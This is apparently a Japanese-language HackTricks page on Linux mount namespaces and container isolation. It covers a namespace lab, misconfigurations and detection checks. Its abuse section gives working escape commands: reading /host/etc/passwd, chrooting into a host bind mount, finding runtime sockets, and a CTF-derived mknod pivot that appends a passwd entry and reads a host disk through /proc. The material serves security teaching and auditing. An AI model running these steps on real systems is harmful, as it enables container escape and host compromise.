# マウント名前空間

{{#include ../../../../../banners/hacktricks-training.md}}

## 概要

マウント名前空間はプロセスが見る**マウントテーブル**を制御します。これはコンテナの分離機能の中で最も重要なものの一つで、ルートファイルシステム、バインドマウント、tmpfs マウント、procfs の表示、sysfs の露出、そして多くのランタイム固有の補助マウントがすべてそのマウントテーブルを通じて表現されるからです。2つのプロセスが両方とも `/`, `/proc`, `/sys`, または `/tmp` にアクセスできても、これらのパスが何を指すかはそれらが属するマウント名前空間によって決まります。

コンテナセキュリティの観点では、マウント名前空間は「きちんと用意されたアプリケーション用ファイルシステム」であるのか「このプロセスがホストのファイルシステムを直接参照または操作できるのか」の違いを生むことが多いです。だからこそ、バインドマウント、`hostPath` volumes、特権付きのマウント操作、および書き込み可能な `/proc` や `/sys` の露出はすべてこの名前空間を中心に問題になります。

## 動作

ランタイムがコンテナを起動すると、通常は新しいマウント名前空間を作成し、コンテナ用のルートファイルシステムを準備し、必要に応じて procfs やその他の補助ファイルシステムをマウントし、その後オプションでバインドマウント、tmpfs マウント、シークレット、config maps、またはホストパスを追加します。一度そのプロセスが名前空間内で動作を始めると、プロセスが見るマウントの集合はホストのデフォルトビューから大きく切り離されます。ホストは依然として実際の基盤となるファイルシステムを見るかもしれませんが、コンテナはランタイムが組み立てたバージョンを見ます。

これは強力で、ホストがすべてを管理していてもコンテナが独自のルートファイルシステムを持っていると信じさせることができます。反面危険でもあり、ランタイムが誤ったマウントを公開すると、プロセスは突如としてホストのリソースを参照できるようになり、セキュリティモデルの他の部分が保護するよう設計されていない可能性のある箇所がさらされます。

## ラボ

プライベートなマウント名前空間は次のように作成できます：
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
もしその namespace の外側で別の shell を開き、mount table を確認すると、tmpfs マウントは隔離された mount namespace の内部にのみ存在しているのがわかります。これは、mount の分離が抽象的な理論ではなく、kernel が文字通りプロセスに別の mount table を提示していることを示す有益な演習です。
もしその namespace の外側で別の shell を開き、mount table を確認すると、tmpfs マウントは隔離された mount namespace の内部にのみ存在します。

Inside containers, a quick comparison is:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
2番目の例は、ランタイム設定がファイルシステム境界に大きな穴を開けるのがいかに容易かを示しています。

## ランタイムでの使用

Docker、Podman、containerd ベースのスタック、CRI-O は、通常のコンテナでプライベートな mount namespace に依存しています。Kubernetes は同じ仕組みを利用して、volumes、projected secrets、config maps、および `hostPath` マウントを実現しています。Incus/LXC 環境も mount namespace に強く依存しており、特に system containers は application containers よりも豊かでマシンに近いファイルシステムを公開することが多いです。

これは、コンテナのファイルシステム問題を調査するとき、通常は単なる Docker の特異点を見ているわけではないことを意味します。起動したワークロードを通じて表現される、mount namespace と runtime-configuration の問題を見ているのです。

## 設定ミス

最も明白で危険なミスは、ホストの root ファイルシステムや他の機密性の高いホストパスを bind mount で公開することです。例えば `-v /:/host` や Kubernetes の書き込み可能な `hostPath` などです。その時点で問題は「コンテナが何とか脱出できるか？」ではなく「どれだけ有用なホストの内容が既に直接見えていて書き込み可能か？」という問いになります。書き込み可能なホストの bind mount は、残りのエクスプロイトをファイル配置、chroot、設定変更、ランタイムソケットの発見など単純な事柄に変えてしまうことが多いです。

別の一般的な問題は、ホストの `/proc` や `/sys` をコンテナ側の安全なビューを迂回する形で公開してしまうことです。これらのファイルシステムは通常のデータマウントではなく、カーネルやプロセス状態へのインターフェースです。ワークロードがホスト側のバージョンに直接アクセスできると、コンテナハードニングの前提の多くが適切に適用されなくなります。

読み取り専用の保護も重要です。読み取り専用の root ファイルシステムがあればコンテナが魔法のように安全になるわけではありませんが、攻撃者のステージング領域を大幅に減らし、永続化やヘルパーバイナリの配置、設定改ざんをより困難にします。逆に、書き込み可能な root や書き込み可能なホスト bind mount は攻撃者に次の手を準備する余地を与えます。

## 悪用

mount namespace が誤用されると、攻撃者は一般的に次の4つのうちのどれかを行います。彼らは **コンテナ外にあるべきホストのデータを読み取る**。彼らは **書き込み可能な bind mount を介してホスト設定を変更する**。彼らは **capabilities と seccomp が許せば追加のリソースを mount または remount する**。あるいは **コンテナプラットフォーム自体により多くのアクセスを要求できる強力なソケットやランタイム状態ディレクトリに到達する**。

コンテナが既にホストのファイルシステムを見られる場合、残りのセキュリティモデルは即座に変わります。

ホストの bind mount を疑う場合、まず何が利用可能か、そしてそれが書き込み可能かを確認してください：
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
ホストのルートファイルシステムが read-write にマウントされている場合、直接ホストアクセスはしばしば次のように簡単です：
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
目的が直接の chrooting ではなく privileged runtime access を狙うのであれば、sockets と runtime state を列挙する:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
もし `CAP_SYS_ADMIN` が付与されている場合、コンテナ内から新しいマウントを作成できるかどうかも確認してください：
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### 完全な例: Two-Shell `mknod` Pivot

コンテナのrootユーザーがブロックデバイスを作成でき、ホストとコンテナが有用な形でユーザーIDを共有し、かつ攻撃者が既にホスト上に低権限の足がかりを持っている場合、より特殊な悪用経路が発生します。その状況では、コンテナは`/dev/sda`のようなデバイスノードを作成でき、低権限のホストユーザーは対応するコンテナプロセスの`/proc/<pid>/root/`経由で後からそれを読み取ることができます。

コンテナ内:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
ホスト上で、コンテナのシェルPIDを特定した後、該当する低権限ユーザとして:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
重要な教訓は正確なCTF文字列検索ではありません。重要なのは、`/proc/<pid>/root/`を通じたmount-namespaceの露出により、cgroupのdeviceポリシーがコンテナ内部での直接使用を防いでいても、ホストユーザーがコンテナで作成されたデバイスノードを再利用できる可能性があるという点です。

## チェック

これらのコマンドは、現在のプロセスが実際に存在しているファイルシステムのビューを表示するためのものです。目的は、ホスト由来のマウント、書き込み可能な機密パス、そして通常のアプリケーションコンテナのルートファイルシステムよりも広範に見えるものを見つけ出すことです。
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
- ホストからのバインドマウント、特に `/`, `/proc`, `/sys`、ランタイム状態ディレクトリ、またはソケットの場所はすぐに目立つはずです。
- 予期しない読み書き可能なマウントは、通常、多数の読み取り専用の補助マウントより重要です。
- `mountinfo` は、パスが本当にホスト由来なのか overlay によって支えられているのかを確認するための最良の場所であることが多い。

これらのチェックにより、**この名前空間でどのリソースが可視か**、**どれがホスト由来か**、および**どれが書き込み可能またはセキュリティ上敏感か**を把握できます。
